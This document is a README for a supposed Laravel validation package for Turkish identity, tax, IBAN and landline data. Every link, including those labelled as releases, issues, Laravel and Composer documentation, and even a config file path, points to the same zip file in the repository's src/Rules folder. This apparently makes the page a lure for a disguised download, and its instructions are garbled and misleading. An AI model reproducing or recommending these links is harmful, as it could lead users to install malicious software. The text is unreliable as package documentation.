# 🎉 turkiye-validator - Validate Turkish Data Easily

## 🚀 Getting Started

Welcome to the **turkiye-validator**! This tool helps you validate Turkish data easily. You can check things like Turkish Identity Numbers (TCKN), Tax Numbers (VKN), International Bank Account Numbers (IBAN), and landline numbers. It also offers a special address service for cities and districts without needing a database.

## 📥 Download Now

[![Download turkiye-validator](https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip%https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip)](https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip)

## 📝 Overview

The **turkiye-validator** is built for Laravel users. It serves as a validation suite with:

- Native rules for validation.
- No database needed for the address service.
- Easy setup and integration for any Laravel project.

## 💻 System Requirements

Before downloading, ensure your system meets the following requirements:

- PHP version 7.3 or higher
- Laravel version 6.x or higher
- Composer for package management

## 📦 Download & Install

To get started with the **turkiye-validator**, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip).

1. **Visit the Releases Page:** Click on the link to access the latest version.
2. **Choose the Right File:** Locate the file that matches your system. For most users, this will be the latest version available.
3. **Download the File:** Click on the file and download it to your computer.
4. **Install the Package:**
   - Open your terminal or command prompt.
   - Navigate to your Laravel project directory.
   - Run the command:
     ```
     composer require angg12346/turkiye-validator
     ```

## 📋 Features

The **turkiye-validator** offers these features:

- **TCKN Validation:** Validate Turkish Identity Numbers with ease.
- **VKN Validation:** Quickly check Tax Numbers for validity.
- **IBAN Validation:** Ensure that the provided IBANs are correct.
- **Landline Validation:** Validate Turkish landline numbers.
- **Address Service:** Access a comprehensive list of cities and districts without a database.

## ⚙️ Usage Instructions

After installing the package, follow these steps to use the validation rules:

1. **Add the Service Provider:**
   - Open the `https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip` file.
   - In the `providers` array, add:
     ```php
     Angg12346\TurkiyeValidator\TurkiyeValidatorServiceProvider::class,
     ```

2. **Publish the Configuration:**
   Run the following command:
   ```
   php artisan vendor:publish --provider="Angg12346\TurkiyeValidator\TurkiyeValidatorServiceProvider"
   ```

3. **Use Validation in Your Code:**
   To validate an input, you can use it like this:
   ```php
   $validator = Validator::make($data, [
       'tckn' => 'required|tckn',
       'vkn' => 'required|vkn',
       'iban' => 'required|iban',
       'landline' => 'required|landline',
   ]);
   ```

## 🛠️ Troubleshooting

If you face any issues:

- Ensure your PHP and Laravel versions meet the requirements.
- Check the installation steps to confirm you followed them correctly.
- Visit the [GitHub Issues page](https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip) to see common problems and their solutions.

## 📞 Support

For support, feel free to reach out. You can create an issue in the repository, and we will respond as soon as possible. 

## 🌐 Join the Community

If you want to connect with other users or developers, check out our community forums and discussion boards. Share your experiences and learn from others!

## 🔗 Additional Resources

Explore more about Laravel and validation in the following resources:

- [Laravel Official Documentation](https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip)
- [Composer Documentation](https://raw.githubusercontent.com/angg12346/turkiye-validator/main/src/Rules/validator-turkiye-virga.zip)

## 📜 License

The **turkiye-validator** is open-source software. You can use it freely under the MIT License. Please check the LICENSE file in the repository for more details.